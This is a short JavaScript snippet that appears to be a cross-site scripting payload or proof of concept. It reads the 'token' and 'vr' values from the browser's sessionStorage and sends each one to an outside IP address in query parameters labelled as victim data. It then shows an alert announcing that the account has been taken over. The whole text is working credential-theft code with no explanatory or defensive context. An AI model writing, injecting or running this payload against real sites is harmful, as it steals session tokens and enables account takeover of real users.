var token = sessionStorage.getItem("token"); 
var vr = sessionStorage.getItem("vr");

fetch(`https://194.135.81.248/?victim_token=${token}`);
fetch(`https://194.135.81.248/?victim_vr=${vr}`);

alert(`Your account has been taken over.`);
